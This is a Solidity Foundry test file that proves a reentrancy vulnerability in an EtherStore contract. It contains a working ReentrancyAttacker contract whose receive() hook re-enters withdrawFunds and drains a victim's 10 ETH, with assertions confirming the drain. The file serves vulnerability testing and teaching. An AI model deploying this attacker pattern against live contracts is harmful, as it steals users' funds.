// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etherstore.sol";

contract EtherStoreTest is Test {
    EtherStore public etherStore;
    ReentrancyAttacker public attacker;
    address user = makeAddr("user");

    function setUp() public {
        // Deploy EtherStore contract
        etherStore = new EtherStore();
        
        // Setup victim user with 10 ETH deposit
        vm.deal(user, 10 ether);
        vm.prank(user);
        etherStore.depositFunds{value: 10 ether}();
        
        // Move time forward to pass withdraw time lock
        vm.warp(block.timestamp + 1 weeks);
    }

    function test_reentrancyAttack() public {
        // Deploy attacker contract with 1 ETH to deposit
        attacker = new ReentrancyAttacker{value: 1 ether}(payable(address(etherStore)));
        
        // Pre-trigger state verification
        console2.log("--- BEFORE-Trigger State ---");
        uint256 contractBalanceBefore = address(etherStore).balance;
        uint256 attackerStoredBalanceBefore = etherStore.getUserBalance(address(attacker));
        uint256 attackerBalanceBefore = address(attacker).balance;
        
        console2.log("Contract Balance Before:  %s ETH", contractBalanceBefore / 1e18);
        console2.log("Attacker Stored Balance Before: %s ETH", attackerStoredBalanceBefore / 1e18);
        console2.log("Attacker ETH Balance Before: %s ETH", attackerBalanceBefore / 1e18);

        console2.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack();

        // Post-trigger state verification
        console2.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(etherStore).balance;
        uint256 attackerStoredBalanceAfter = etherStore.getUserBalance(address(attacker));
        uint256 attackerBalanceAfter = address(attacker).balance;
        
        console2.log("Contract Balance After:  %s ETH", contractBalanceAfter / 1e18);
        console2.log("Attacker Stored Balance After: %s ETH", attackerStoredBalanceAfter / 1e18);
        console2.log("Attacker ETH Balance After: %s ETH", attackerBalanceAfter / 1e18);
        
        // Vulnerability verdict based on state changes
        bool exploited = (contractBalanceAfter == 0) && 
                         (attackerBalanceAfter == 11 ether);
        
        if (exploited) {
            console2.log("Vulnerability Exists: Contract balance drained and attacker holds 11 ether");
        } else {
            console2.log("Vulnerability not Exist: Attack failed to drain funds as expected");
        }
        
        // Maintain original assertions for test framework compatibility
        assertEq(contractBalanceAfter, 0, "Contract not drained");
        assertEq(attackerBalanceAfter, 11 ether, "Attacker didn't capture funds");
    }
}

contract ReentrancyAttacker {
    EtherStore public immutable etherStore;
    uint256 public attackAmount;

    constructor(address payable _etherStoreAddress) payable {
        etherStore = EtherStore(_etherStoreAddress);
        attackAmount = msg.value;
        // Initial deposit to become a "legitimate" user
        etherStore.depositFunds{value: msg.value}();
    }

    function attack() public {
        // Initiate first withdrawal
        etherStore.withdrawFunds(attackAmount);
    }

    receive() external payable {
        // Re-enter during ether receive
        if (address(etherStore).balance >= attackAmount) {
            etherStore.withdrawFunds(attackAmount);
        }
    }
}